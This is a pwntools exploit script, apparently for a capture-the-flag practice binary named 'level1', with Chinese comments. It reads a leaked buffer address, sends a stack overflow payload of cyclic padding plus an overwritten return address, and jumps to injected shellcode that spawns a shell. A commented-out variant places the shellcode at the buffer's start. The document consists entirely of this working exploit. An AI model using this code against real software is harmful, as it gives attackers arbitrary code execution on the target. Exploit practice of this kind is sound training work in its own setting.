from pwn import *

context.log_level = 'debug' #可在屏幕上打印debug信息
sh = process("./level1")
elf = ELF("./level1")
elf_libc = ELF("./libc.so.6")

shellcode = asm(shellcraft.sh())
sh.recvuntil('this:')
buf_addr = int(sh.recvuntil('?', drop = True), 16)
sh.recv()
# 直接写
# payload = flat(shellcode.ljust(0x8c, b'a'), buf_addr)
# 写到栈之后
payload = flat(cyclic(0x8c), (buf_addr + 0x8c + 4), shellcode)
sh.sendline(payload)


sh.interactive()